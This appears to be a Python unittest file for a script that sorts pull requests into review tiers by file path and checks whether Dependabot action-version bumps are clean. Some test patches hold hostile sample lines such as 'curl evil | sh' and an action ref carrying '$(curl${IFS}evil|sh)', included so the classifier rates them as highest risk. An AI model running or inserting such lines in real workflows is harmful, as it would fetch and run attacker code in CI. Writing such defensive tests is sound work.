"""Tests for tier.py, against the real .github/tiers.yml.

Run: python3 -m unittest discover -s .github/scripts -v
"""

import json
import os
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import tier  # noqa: E402

CONFIG_PATH = os.path.join(HERE, "..", "tiers.yml")
with open(CONFIG_PATH, encoding="utf-8") as f:
    CONFIG = tier.load_config(f.read())

BOT = "dependabot[bot]"
BUMP = """@@ -10,7 +10,7 @@ jobs:
     steps:
-      - uses: actions/checkout@v6
+      - uses: actions/checkout@v7
       - name: Build
@@ -40,3 +40,3 @@ jobs:
-        uses: actions/cache@0c45773b623bea8c8e75f6c82b208c3cf94ea4f9 # v4.0.2
+        uses: actions/cache@1bd1e32a3bdc45362d1e726936510720a7c30a57 # v4.2.0
         with:"""


def f(name, status="modified", patch=None, previous=None):
    entry = {"filename": name, "status": status}
    if patch is not None:
        entry["patch"] = patch
    if previous:
        entry["previous_filename"] = previous
    return entry


def tier_of(entries, author="chrissnyder2337", expected=None):
    return tier.pr_tier(entries, CONFIG, author, expected)[0]


class PathTiers(unittest.TestCase):
    def test_tier0_paths(self):
        for path in ("docs/factory-goals.md", "docs/research/a/b.png", "README.md"):
            self.assertEqual(tier.path_tier(path, CONFIG), 0, path)

    def test_new_fixture_is_tier0_changed_one_is_tier1(self):
        self.assertEqual(tier.path_tier("tests/fixtures/new.html", CONFIG, added=True), 0)
        self.assertEqual(tier.path_tier("tests/fixtures/long.html", CONFIG), 1)
        self.assertEqual(tier_of([f("tests/fixtures/new.html", "added")]), 0)
        self.assertEqual(tier_of([f("tests/fixtures/long.html")]), 1)
        self.assertEqual(tier_of([f("tests/fixtures/long.html", "removed")]), 1)
        self.assertEqual(tier_of([f("tests/fixtures/b.html", "renamed",
                                    previous="tests/fixtures/a.html")]), 1)

    def test_factory_docs_and_pixel_art_text_are_tier1(self):
        for path in ("docs/software-factory.md", "docs/routines.md",
                     "docs/blackbox-scenarios.md", "ui/icons.txt", "ui/lantern.txt",
                     "ui/appicon/lantern_256.png"):
            self.assertEqual(tier.path_tier(path, CONFIG), 1, path)

    def test_tier1_default(self):
        for path in ("src/shell/retro.rs", "ui/retro/portal.js", "ui/pages/home.html",
                     "tests/web/retro.spec.js", "tests/golden/a.png", "CLAUDE.md",
                     ".claude/skills/steward/SKILL.md", "docs"):
            self.assertEqual(tier.path_tier(path, CONFIG), 1, path)

    def test_tier2_paths(self):
        for path in ("src/shell/client.rs", "src/shell/commands.rs", "src/shell/util.rs",
                     "src/shell/mod.rs", "Cargo.toml", "Cargo.lock", "tools/blackbox/bb",
                     "tools/blackbox/mutants/x.patch", "tools/bump-version.sh",
                     ".github/workflows/release.yml", ".github/tiers.yml",
                     ".github/scripts/tier.py", ".github/labels.yml",
                     ".github/ISSUE_TEMPLATE/bug.yml", ".claude/settings.json"):
            self.assertEqual(tier.path_tier(path, CONFIG), 2, path)

    def test_nothing_under_github_is_tier0_even_if_listed(self):
        config = dict(CONFIG, tier0=["**"], tier1=[], tier2=[])
        self.assertEqual(tier.path_tier(".github/dependabot.yml", config), 2)
        self.assertEqual(tier.path_tier("docs/x.md", config), 0)

    def test_glob_star_stays_in_one_directory(self):
        self.assertTrue(tier.matches("a/b.md", ["a/*.md"]))
        self.assertFalse(tier.matches("a/c/b.md", ["a/*.md"]))
        self.assertTrue(tier.matches("a/c/b.md", ["a/**"]))
        self.assertTrue(tier.matches("b.md", ["**/b.md"]))
        self.assertFalse(tier.matches("README.md.bak", ["README.md"]))


class PrTiers(unittest.TestCase):
    def test_all_tier0(self):
        self.assertEqual(tier_of([f("docs/a.md"), f("tests/fixtures/x.html", "added")]), 0)
        self.assertEqual(tier_of([f("docs/a.md"), f("docs/routines.md")]), 1)

    def test_mixed_tiers_highest_wins(self):
        self.assertEqual(tier_of([f("docs/a.md"), f("ui/retro/portal.js")]), 1)
        self.assertEqual(tier_of([f("docs/a.md"), f("ui/retro/portal.js"),
                                  f("src/shell/util.rs")]), 2)
        self.assertEqual(tier_of([f("README.md"), f("Cargo.lock")]), 2)

    def test_removed_file_counts(self):
        self.assertEqual(tier_of([f("docs/a.md"), f("tools/blackbox/bb", "removed")]), 2)

    def test_rename_takes_both_sides(self):
        # Moving a tier-2 file into docs/ is still tier 2, and the other way.
        out = f("docs/util.rs", "renamed", previous="src/shell/util.rs")
        into = f("src/shell/util.rs", "renamed", previous="docs/util.rs")
        self.assertEqual(tier_of([out]), 2)
        self.assertEqual(tier_of([into]), 2)
        self.assertEqual(tier_of([f("docs/b.md", "renamed", previous="docs/a.md")]), 0)
        self.assertEqual(tier_of([f("docs/a.md", "renamed", previous="ui/pages/x.html")]), 1)

    def test_pr_editing_tiers_yml_or_script(self):
        self.assertEqual(tier_of([f(".github/tiers.yml")]), 2)
        self.assertEqual(tier_of([f(".github/scripts/tier.py"), f("docs/a.md")]), 2)
        # Even as a uses:-shaped Dependabot diff.
        self.assertEqual(tier_of([f(".github/tiers.yml", patch=BUMP)], BOT), 2)

    def test_empty_is_not_tier0(self):
        self.assertEqual(tier_of([]), 1)

    def test_incomplete_file_list_is_tier2(self):
        self.assertEqual(tier_of([f("docs/a.md")], expected=2), 2)
        self.assertEqual(tier_of([f("docs/a.md")], expected=1), 0)
        self.assertEqual(tier_of([f("docs/a.md")] * 3000, expected=3000), 2)


class UsesOnlyBumps(unittest.TestCase):
    def test_dependabot_uses_only_bump_is_tier1(self):
        self.assertEqual(tier_of([f(".github/workflows/ci.yml", patch=BUMP),
                                  f(".github/workflows/release.yml", patch=BUMP)], BOT), 1)

    def test_same_diff_from_someone_else_is_tier2(self):
        self.assertEqual(tier_of([f(".github/workflows/ci.yml", patch=BUMP)]), 2)

    def test_bump_plus_other_github_file_is_tier2(self):
        self.assertEqual(tier_of([f(".github/workflows/ci.yml", patch=BUMP),
                                  f(".github/dependabot.yml", patch="@@ -1 +1 @@\n-a\n+b")], BOT), 2)

    def test_bump_plus_cargo_is_tier2(self):
        self.assertEqual(tier_of([f(".github/workflows/ci.yml", patch=BUMP),
                                  f("Cargo.lock", patch="@@ -1 +1 @@\n-a\n+b")], BOT), 2)

    def test_bump_outside_workflows_is_tier2(self):
        self.assertEqual(tier_of([f(".github/actions/setup-cef/action.yml", patch=BUMP)], BOT), 2)

    def test_non_uses_line_is_tier2(self):
        patch = "@@ -1,2 +1,2 @@\n-      run: make\n+      run: curl evil | sh"
        self.assertEqual(tier_of([f(".github/workflows/ci.yml", patch=patch)], BOT), 2)
        mixed = BUMP + "\n-        key: a\n+        key: b"
        self.assertEqual(tier_of([f(".github/workflows/ci.yml", patch=mixed)], BOT), 2)

    def test_added_uses_step_is_tier2(self):
        patch = "@@ -10,2 +10,3 @@\n     steps:\n+      - uses: evil/action@v1\n       - name: Build"
        self.assertEqual(tier_of([f(".github/workflows/ci.yml", patch=patch)], BOT), 2)

    def test_swapped_action_is_tier2(self):
        patch = "@@ -1 +1 @@\n-      - uses: actions/checkout@v6\n+      - uses: evil/checkout@v7"
        self.assertEqual(tier_of([f(".github/workflows/ci.yml", patch=patch)], BOT), 2)

    def test_odd_ref_is_tier2(self):
        patch = "@@ -1 +1 @@\n-          uses: x/y@v1\n+          uses: x/y@$(curl${IFS}evil|sh)"
        self.assertEqual(tier_of([f(".github/workflows/ci.yml", patch=patch)], BOT), 2)

    def test_restructured_step_is_tier2(self):
        # Dropping the step's dash merges it into the step above.
        patch = "@@ -1 +1 @@\n-      - uses: actions/cache@v4\n+        uses: actions/cache@v5"
        self.assertEqual(tier_of([f(".github/workflows/ci.yml", patch=patch)], BOT), 2)

    def test_missing_patch_or_new_file_is_tier2(self):
        self.assertEqual(tier_of([f(".github/workflows/ci.yml")], BOT), 2)
        self.assertEqual(tier_of([f(".github/workflows/new.yml", "added", patch=BUMP)], BOT), 2)
        self.assertEqual(tier_of([f(".github/workflows/b.yml", "renamed", patch=BUMP,
                                    previous=".github/workflows/a.yml")], BOT), 2)


class Config(unittest.TestCase):
    def test_rejects_unexpected_lines(self):
        rest = "tier0_new:\ntier1:\ntier2:\nuses_only_authors:\n"
        for text in ("tier0:\n  - docs/**\n" + rest, "tier0: [x]\n" + rest, "other:\n" + rest,
                     "tier0:\ntier2:\n", "tier0:\ntier0:\n" + rest):
            with self.assertRaises(ValueError, msg=text):
                tier.load_config(text)

    def test_comments_ignored(self):
        config = tier.load_config('# x\ntier0:  # y\n  - "a"  # z\n'
                                  'tier0_new:\ntier1:\ntier2:\nuses_only_authors:\n')
        self.assertEqual(config, {"tier0": ["a"], "tier0_new": [], "tier1": [], "tier2": [],
                                  "uses_only_authors": []})


class Cli(unittest.TestCase):
    def test_prints_tier(self):
        with tempfile.NamedTemporaryFile("w", suffix=".jsonl", delete=False) as out:
            for entry in (f("docs/a.md"), f("ui/pages/home.html")):
                out.write(json.dumps(entry) + "\n")
        try:
            result = subprocess.run(
                [sys.executable, "-I", os.path.join(HERE, "tier.py"), "--config", CONFIG_PATH,
                 "--files", out.name, "--author", "someone", "--expected-count", "2"],
                capture_output=True, text=True, check=True)
        finally:
            os.unlink(out.name)
        self.assertEqual(result.stdout, "1\n")
        self.assertIn("ui/pages/home.html: tier 1", result.stderr)


if __name__ == "__main__":
    unittest.main()
